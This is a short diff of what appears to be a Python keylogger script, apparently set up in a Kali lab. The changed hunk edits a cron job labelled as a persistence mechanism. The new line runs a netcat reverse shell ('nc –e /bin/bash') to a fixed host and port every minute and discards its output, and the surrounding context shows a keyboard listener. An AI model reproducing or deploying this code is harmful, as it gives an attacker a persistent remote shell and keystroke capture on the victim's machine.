@@ -39,7 +39,7 @@ with Listener(on_press=on_press) as listener:
     
 # Create a cronjob reverse shell to establish persistence
 my_cron = CronTab(user='kali')
-job = my_cron.new(command='nc 192.168.1.115 4444 –e /bin/bash')
+job = my_cron.new(command='/bin/nc –e /bin/bash 192.168.56.10 4444 >/dev/null 2>&1')
 job.minute.every(1)
 
 my_cron.write()
